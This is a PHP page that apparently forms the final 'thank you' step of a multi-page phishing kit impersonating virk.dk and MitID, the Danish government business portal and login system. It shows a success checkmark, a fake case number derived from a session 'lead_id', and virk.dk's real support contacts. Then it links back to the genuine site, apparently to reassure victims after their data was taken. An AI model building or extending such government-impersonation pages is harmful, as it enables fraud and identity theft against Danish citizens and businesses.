<?php
require_once 'config.php';
session_start();

if (!isset($_SESSION['lead_id'])) {
    header('Location: index.php');
    exit;
}
?>
<!DOCTYPE html>
<html lang="da">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo $page5_title; ?></title>
    <link rel="icon" type="image/svg+xml" href="assets/logo.svg">
    <link rel="stylesheet" href="assets/style.css">
</head>
<body class="mitid-page">
    <header class="mitid-nav">
        <div class="mitid-nav-container">
            <img src="assets/logo.svg" alt="Virk Logo" class="mitid-logo">
            <span class="mitid-brand">virk.dk</span>
        </div>
    </header>

    <main class="mitid-main">
        <div class="mitid-container">
            <div class="thank-you-box">
                <div class="success-animation">
                    <svg viewBox="0 0 100 100" width="80" height="80">
                        <circle cx="50" cy="50" r="45" fill="#4CAF50" opacity="0.1"/>
                        <circle cx="50" cy="50" r="40" fill="none" stroke="#4CAF50" stroke-width="3"/>
                        <path d="M30 50 L45 65 L70 35" 
                              fill="none" 
                              stroke="#4CAF50" 
                              stroke-width="5" 
                              stroke-linecap="round" 
                              stroke-linejoin="round"
                              class="checkmark"/>
                    </svg>
                </div>
                
                <h1><?php echo $page5_title; ?></h1>
                <p class="thank-message"><?php echo $page5_message; ?></p>
                
                <div class="reference-number">
                    <p>Sagsnummer: <strong>#<?php echo strtoupper(substr($_SESSION['lead_id'], 0, 8)); ?></strong></p>
                </div>
                
                <div class="info-box">
                    <p>📞 Kundeservice: 35 29 10 00</p>
                    <p>✉️ Email: support@virk.dk</p>
                    <p>🕐 Åbningstider: Man-Fre 8:00-16:00</p>
                </div>
                
                <a href="https://virk.dk" class="return-link">← Tilbage til forsiden</a>
            </div>
        </div>
    </main>
    
    <script>
        // Animate checkmark
        document.addEventListener('DOMContentLoaded', function() {
            const checkmark = document.querySelector('.checkmark');
            if (checkmark) {
                checkmark.style.strokeDasharray = '1000';
                checkmark.style.strokeDashoffset = '1000';
                checkmark.style.animation = 'drawCheck 1s ease forwards';
            }
        });
    </script>
</body>
</html>
